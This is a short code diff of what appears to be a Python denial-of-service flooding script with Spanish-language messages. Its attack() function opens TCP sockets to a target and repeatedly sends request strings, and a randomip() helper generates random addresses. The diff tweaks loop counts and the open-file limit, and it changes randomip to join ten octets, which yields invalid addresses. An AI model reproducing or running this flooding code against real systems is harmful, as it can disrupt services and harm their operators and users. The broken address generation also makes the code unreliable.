@@ -27,7 +27,7 @@ def progressbar(it, prefix="", size=60, file=sys.stdout):
     
 import time
 
-for i in progressbar(range(100), "Barra Util: ", 40):
+for i in progressbar(range(10), "Barra Util: ", 40):
     time.sleep(0.2)
     
     
@@ -38,7 +38,7 @@ print("System detected: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 1030000")
+    os.system("ulimit -n 1000")
   except Exception as e:
     print(e)
     print("No se pudo iniciar el script")
@@ -47,7 +47,7 @@ else:
 
 
 def randomip():
-  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(10))
   return randip
 
 
@@ -62,7 +62,7 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(80,8080,443):
+      for y in range(80):
           atk.send(str.encode(request))
     except socket.error:
       sleep(0)
